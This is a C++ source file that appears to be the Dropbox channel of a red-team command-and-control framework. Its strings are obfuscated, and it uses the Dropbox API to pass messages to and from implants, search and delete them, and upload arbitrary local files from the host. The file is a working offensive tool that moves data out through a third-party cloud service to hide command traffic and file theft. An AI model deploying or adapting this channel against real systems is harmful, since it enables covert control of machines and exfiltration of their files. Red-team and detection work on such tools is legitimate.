#include "stdafx.h"
#include "DropboxApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include <random>
#include <cctype>
#include <algorithm>
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::Dropbox::Dropbox(std::string const& userAgent, std::string const& token, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_Token = token;
	this->m_UserAgent = userAgent;
	SetChannel(CreateChannel(Convert<Lowercase>(channelName)));
}

void FSecure::Dropbox::SetChannel(std::string const& channelName)
{
	this->m_Channel = channelName;
}

void FSecure::Dropbox::SetToken(std::string const& token)
{
	this->m_Token = token;
}

void FSecure::Dropbox::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename)
{
	std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");

	std::string filename;

	if (providedFilename.empty())
	{
		///Create a filename thats prefixed with message direction and suffixed
		// with more granular timestamp for querying later
		std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
	}
	else
		filename = providedFilename;

	json j;
	j[OBF("path")] = OBF("/") + this->m_Channel + OBF("/") + filename;
	j[OBF("mode")] = OBF("add");
	j[OBF("autorename")] = false;
	j[OBF("mute")] = true;
	j[OBF("strict_conflict")] = true;

	SendHttpRequest(url, j.dump(), ContentType::ApplicationOctetstream, data);
}

void FSecure::Dropbox::UploadFile(std::string const& path)
{
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

void FSecure::Dropbox::DeleteAllFiles()
{
	std::string folderPath = OBF("/") + this->m_Channel;
	DeleteFile(folderPath);
}

std::map<std::string, std::string> FSecure::Dropbox::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = OBF("https://api.dropboxapi.com/2/files/list_folder");
	json j;
	j[OBF("path")] = OBF("");  // Read from the root of the directory

	json response = SendJsonRequest(url, j);

	for (auto& channel : response[OBF("entries")])
	{
		std::string item_type = channel[OBF(".tag")];
		if (item_type == OBF("folder"))
			channelMap.emplace(channel[OBF("name")], channel[OBF("id")]);
	}

	return channelMap;
}

std::string FSecure::Dropbox::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::string> channels = this->ListChannels();

	if (channels.find(channelName) == channels.end())
	{
		std::string url = OBF("https://api.dropboxapi.com/2/files/create_folder_v2");

		json j;
		j[OBF("path")] = OBF("/") + channelName;
		j[OBF("autorename")] = false;

		json response = SendJsonRequest(url, j);

		if (!response[OBF("metadata")].contains(OBF("name")))
			throw std::runtime_error(OBF("Throwing exception: unable to create channel\n"));
	}
	return channelName;
}

std::map<std::string, std::string> FSecure::Dropbox::GetMessagesByDirection(std::string const& direction)
{
	std::map<std::string, std::string> messages;
	json response;
	std::string cursor;

	// If our search results roll over to another page (unlikely) we use a different endpoint
	// to retrieve the extra file details
	do
	{
		if (cursor.empty())
		{
			std::string url = OBF("https://api.dropboxapi.com/2/files/search_v2");

			json search_options;
			search_options[OBF("path")] = OBF("/") + this->m_Channel;
			search_options[OBF("filename_only")] = true;
			json j;
			j[OBF("query")] = OBF("^") + direction;   // regexp
			j[OBF("options")] = search_options;

			response = SendJsonRequest(url, j);
		}
		else
		{
			std::string url = OBF("https://api.dropboxapi.com/2/files/search/continue_v2");

			json j;
			j[OBF("cursor")] = cursor;

			response = SendJsonRequest(url, j);
		}

		if (response[OBF("has_more")] == OBF("true"))
			cursor = response[OBF("cursor")];

		for (auto& match : response[OBF("matches")])
		{
			std::string item_type = match[OBF("metadata")][OBF("metadata")][OBF(".tag")];
			std::string file_name = match[OBF("metadata")][OBF("metadata")][OBF("path_lower")];
			std::string file_id = match[OBF("metadata")][OBF("metadata")][OBF("id")];

			std::string ts = file_name.substr(file_name.length() - 10); // 10 = epoch time length

			if (item_type == OBF("file"))
				messages.insert({ ts, file_id });
		}
	} while (response[OBF("has_more")] == OBF("true"));

	return messages;
}

FSecure::ByteVector FSecure::Dropbox::ReadFile(std::string const& filename)
{
	std::string url = OBF_STR("https://content.dropboxapi.com/2/files/download");
	json j;
	j[OBF("path")] = filename;

	return SendHttpRequest(url, j.dump());
}

void FSecure::Dropbox::DeleteFile(std::string const& filename)
{
	std::string url = OBF("https://api.dropboxapi.com/2/files/delete_v2");
	json j;
	j[OBF("path")] = filename;

	SendJsonRequest(url, j);
}

FSecure::ByteVector FSecure::Dropbox::SendHttpRequest(std::string const& host, std::string const& header, std::optional<WinHttp::ContentType> contentType, ByteView data)
{
	while (true)
	{
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request; // default request is GET
		request.m_Method = Method::POST;
		request.SetTimeout({}, {}, 0ms, 0ms);

		if (contentType && !data.empty())
			request.SetData(*contentType, { data.begin(), data.end() });

		if(!header.empty())
			request.SetHeader(OBF(L"Dropbox-API-Arg"), ToWideString(header));

		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));
		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK)
			return resp.GetData();
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		else
			throw std::runtime_error(OBF("[x] Non 200/429 HTTP Response\n"));
	}
}

json FSecure::Dropbox::SendJsonRequest(std::string const& url, json const& data)
{
	return json::parse(SendHttpRequest(url, "", ContentType::ApplicationJson, ByteView{ data.dump() }));
}
